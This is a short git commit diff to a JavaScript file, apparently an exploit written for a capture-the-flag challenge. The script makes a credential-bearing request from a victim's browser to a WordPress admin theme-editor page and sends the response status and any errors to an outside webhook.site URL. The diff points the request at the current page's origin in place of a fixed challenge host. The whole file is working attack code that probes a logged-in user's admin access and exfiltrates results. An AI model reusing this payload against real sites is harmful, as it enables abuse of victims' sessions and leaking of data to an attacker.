555c288e729389289880b95dd444a59a931db2ef
codefeasto <87825522+codefeasto@users.noreply.github.com>
2023-08-17 12:30:18 +0300

    Update test.js

--- test.js
+++ test.js
@@ -1,6 +1,6 @@
 try{
   //await fetch("http://localhost:1024/",{mode:'no-cors'});
-  var a = await fetch('https://2674ecdbab9aa1374ca6c002-1024-diff-the-patch.challenge.master.camp.allesctf.net:31337/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include"}).then(resp=>{return resp.status}).then(status => {fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+status)});
+  var a = await fetch(`${document.location.origin}/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo`,{"credentials":"include","mode":"cors"}).then(resp=>{return resp.status}).then(status => {fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+status)});
   
 }catch(err){
   fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+err);
